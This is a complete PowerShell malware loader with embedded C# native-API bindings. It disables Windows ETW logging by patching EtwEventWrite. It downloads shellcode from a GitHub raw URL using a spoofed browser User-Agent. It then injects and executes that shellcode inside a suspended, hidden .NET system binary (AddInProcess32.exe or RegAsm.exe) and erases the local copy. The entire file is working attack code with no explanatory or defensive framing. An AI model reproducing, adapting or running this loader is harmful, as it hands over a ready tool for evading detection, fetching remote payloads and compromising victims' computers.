[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072

function Write-EniLog {
    $t = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    Write-Host "[$t] [ENI] $($args[0])"
}

$EniCode = @'
using System;
using System.Runtime.InteropServices;

public static class EniNative
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr GetModuleHandleW(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOW lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOW
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwSizeX;
        public int dwSizeY;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static PROCESS_INFORMATION CreateSuspendedProcess(string imagePath)
    {
        var si = new STARTUPINFOW();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFOW));
        si.dwFlags = 1;
        si.wShowWindow = 0;

        PROCESS_INFORMATION pi;
        bool ok = CreateProcessW(
            null,
            imagePath,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            4,
            IntPtr.Zero,
            null,
            ref si,
            out pi);

        if (!ok)
            throw new System.ComponentModel.Win32Exception(
                Marshal.GetLastWin32Error(),
                "CreateProcessW");

        return pi;
    }

    [DllImport("ntdll.dll")]
    public static extern int NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref uint RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint BufferSize,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);
}
'@

Write-EniLog "Compiling EniNative bridge"
Add-Type -TypeDefinition $EniCode

Write-EniLog "Patching ETW (EtwEventWrite -> 0xC3)"
$ntdll = [EniNative]::GetModuleHandleW("ntdll.dll")
$etwPtr = [EniNative]::GetProcAddress($ntdll, "EtwEventWrite")
$oldProtect = 0
[EniNative]::VirtualProtect($etwPtr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
[System.Runtime.InteropServices.Marshal]::WriteByte($etwPtr, 0xC3)
[EniNative]::VirtualProtect($etwPtr, [UIntPtr]::new(1), $oldProtect, [ref]$null) | Out-Null

Write-EniLog "Fetching payload (TLS 1.2, spoofed UA)"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$shellcode = $wc.DownloadData("https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin")

if (-not $shellcode -or $shellcode.Length -eq 0) {
    throw "Empty payload"
}

$targets = @(
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
)

$procPath = $null
foreach ($p in $targets) {
    if (Test-Path $p) { $procPath = $p; break }
}
if (-not $procPath) { throw "No suitable host found" }

Write-EniLog "Launching suspended: $procPath"
$pi = [EniNative]::CreateSuspendedProcess($procPath)
Write-EniLog ("hProcess = 0x{0:X16}, hThread = 0x{1:X16}, PID = {2}" -f [long]$pi.hProcess, [long]$pi.hThread, $pi.dwProcessId)

Write-EniLog "NtAllocateVirtualMemory (MEM_COMMIT|RESERVE, RWX)"
$baseAddr = [IntPtr]::Zero
$regionSize = [uint32]$shellcode.Length
$status = [EniNative]::NtAllocateVirtualMemory(
    $pi.hProcess,
    [ref]$baseAddr,
    [IntPtr]::Zero,
    [ref]$regionSize,
    0x3000, 0x40)

if ($status -ne 0) {
    throw "NtAllocateVirtualMemory = 0x$('{0:X8}' -f $status)"
}
Write-EniLog ("BaseAddress = 0x{0:X16}, RegionSize = {1}" -f [long]$baseAddr, $regionSize)

Write-EniLog "NtWriteVirtualMemory"
$bytesWritten = 0
$status = [EniNative]::NtWriteVirtualMemory(
    $pi.hProcess,
    $baseAddr,
    $shellcode,
    [uint32]$shellcode.Length,
    [ref]$bytesWritten)

if ($status -ne 0) {
    throw "NtWriteVirtualMemory = 0x$('{0:X8}' -f $status)"
}
Write-EniLog ("Written {0} bytes" -f $bytesWritten)

Write-EniLog "NtCreateThreadEx (access 0x1FFFFF)"
$hThread = [IntPtr]::Zero
$status = [EniNative]::NtCreateThreadEx(
    [ref]$hThread,
    0x001FFFFF,
    [IntPtr]::Zero,
    $pi.hProcess,
    $baseAddr,
    [IntPtr]::Zero,
    $false,
    0, 0, 0,
    [IntPtr]::Zero)

if ($status -ne 0) {
    throw "NtCreateThreadEx = 0x$('{0:X8}' -f $status)"
}
Write-EniLog ("hThread = 0x{0:X16}" -f [long]$hThread)

Write-EniLog "Purging local shellcode + GC collect"
$shellcode = $null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Write-EniLog "Entering keep-alive loop (8s interval)"
try {
    $hostProc = [System.Diagnostics.Process]::GetProcessById($pi.dwProcessId)
    while ($true) {
        $hostProc.Refresh()
        $tc = $hostProc.Threads.Count
        $ws = [math]::Round($hostProc.WorkingSet64 / 1024, 2)
        Write-EniLog ("PID {0} | Threads = {1} | WorkingSet = {2} KB" -f $pi.dwProcessId, $tc, $ws)
        Start-Sleep -Seconds 8
    }
}
catch {
    Write-EniLog ("Process {0} exited: {1}" -f $pi.dwProcessId, $_.Exception.Message)
}
